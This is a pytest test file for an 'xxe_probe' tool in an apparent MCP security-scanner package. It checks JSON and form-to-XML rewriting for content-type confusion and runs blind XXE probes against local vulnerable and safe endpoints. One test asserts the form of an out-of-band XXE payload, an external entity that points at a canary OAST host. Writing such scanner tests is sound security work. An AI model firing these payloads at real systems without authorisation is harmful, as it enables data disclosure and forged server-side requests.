"""xxe_probe — content-type confusion + blind XXE via OAST, pure + e2e."""

import json

import pytest

from moonmcp import server as srv
from moonmcp.web import xxe as xxemod


# -- pure -----------------------------------------------------------------------
def test_json_to_xml_basic():
    xml = xxemod.json_to_xml('{"user": "bob", "id": 42}')
    assert xml.startswith('<?xml version="1.0"?><root>')
    assert "<user>bob</user>" in xml and "<id>42</id>" in xml


def test_json_to_xml_nested_and_list():
    xml = xxemod.json_to_xml('{"a": {"b": 1}, "tags": ["x", "y"]}')
    assert "<a><b>1</b></a>" in xml
    assert "<tags>x</tags><tags>y</tags>" in xml


def test_json_to_xml_rejects_non_object():
    assert xxemod.json_to_xml("[1,2,3]") is None
    assert xxemod.json_to_xml('"just a string"') is None
    assert xxemod.json_to_xml("not json at all") is None


def test_json_to_xml_escapes_special_chars():
    xml = xxemod.json_to_xml('{"note": "<script>&\\"quote\\"</script>"}')
    assert "<script>" not in xml.split("<note>")[1].split("</note>")[0].replace("&lt;", "")
    assert "&lt;script&gt;" in xml and "&amp;" in xml


def test_sanitize_tag_handles_digit_start_and_invalid_chars():
    assert xxemod._sanitize_tag("123bad-name!") == "_123bad-name_"
    assert xxemod._sanitize_tag("normal_name") == "normal_name"
    assert xxemod._sanitize_tag("") == "field"


def test_json_to_xml_sanitizes_invalid_tag_names():
    xml = xxemod.json_to_xml(json.dumps({"123bad-name!": "v"}))
    assert "<_123bad-name_>v</_123bad-name_>" in xml


def test_form_to_xml_basic():
    xml = xxemod.form_to_xml("user=bob&id=42")
    assert "<user>bob</user>" in xml and "<id>42</id>" in xml


def test_form_to_xml_empty_returns_none():
    assert xxemod.form_to_xml("") is None


def test_xxe_oob_payload_structure():
    payload = xxemod.xxe_oob_payload("http://canary.oast.test/x")
    assert "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://canary.oast.test/x\">]>" in payload
    assert payload.endswith("<root>&xxe;</root>")


# -- end-to-end -------------------------------------------------------------------
@pytest.mark.asyncio
async def test_xxe_probe_registered(fresh_context):
    tools = {t.name for t in await srv.mcp.list_tools()}
    assert "xxe_probe" in tools


@pytest.mark.asyncio
async def test_xxe_probe_format_confusion_rewrites_and_sends(local_server, fresh_context):
    base, _ = local_server
    # /nosqli-safe answers 200 to any POST body/content-type — a stand-in for "the
    # endpoint accepted the rewritten XML body sent under the original Content-Type".
    res = await srv.xxe_probe(target=f"{base}/nosqli-safe", body='{"a": 1}',
                              content_type="application/json")
    fc = res["format_confusion"]
    assert fc["status"] == 200
    assert "<a>1</a>" in fc["rewritten_body"]


@pytest.mark.asyncio
async def test_xxe_probe_format_confusion_error_on_non_rewritable_body(local_server, fresh_context):
    base, _ = local_server
    res = await srv.xxe_probe(target=f"{base}/echo", body="not json or form ???",
                              content_type="application/json")
    assert res["format_confusion"]["error"] == "not_rewritable"


@pytest.mark.asyncio
async def test_xxe_probe_oob_via_selfhost_vulnerable(local_server, fresh_context):
    base, _ = local_server
    await srv.oast_selfhost(action="start", host="127.0.0.1")
    try:
        res = await srv.xxe_probe(target=f"{base}/xxe-oob", wait=1.5)
        assert res["oob"]["interaction_count"] >= 1, res
        assert res["verdict"] == "confirmed"
    finally:
        await srv.oast_selfhost(action="stop")


@pytest.mark.asyncio
async def test_xxe_probe_oob_via_selfhost_safe(local_server, fresh_context):
    base, _ = local_server
    await srv.oast_selfhost(action="start", host="127.0.0.1")
    try:
        res = await srv.xxe_probe(target=f"{base}/xxe-safe", wait=1.5)
        assert res["oob"]["interaction_count"] == 0
        assert res["verdict"] == "unconfirmed"
    finally:
        await srv.oast_selfhost(action="stop")


@pytest.mark.asyncio
async def test_xxe_probe_oob_unconfigured_reports_error(fresh_context, local_server):
    base, _ = local_server
    res = await srv.xxe_probe(target=f"{base}/xxe-safe")
    assert res["oob"]["error"] == "oast_unconfigured"
    assert res["verdict"] == "unconfirmed"
